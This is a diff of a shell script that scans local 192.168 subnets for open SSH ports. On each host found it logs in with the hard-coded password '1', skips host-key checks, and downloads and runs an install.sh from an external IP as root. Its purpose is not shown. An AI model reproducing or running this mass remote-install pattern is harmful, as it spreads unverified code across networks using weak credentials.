@@ -6,8 +6,11 @@
         do
           if nc -w 1 -zv 192.168.$m.$i 22 &>> /dev/null
           then
-            echo "Processing 192.168.2.$i"
-           sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.$m.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
+            echo "Processing 192.168.$m.$i  ================  \n"
+            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.$m.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
+            sleep 5
+          else
+            echo "Empty 192.168.$m.$i"
           fi
      done
 done
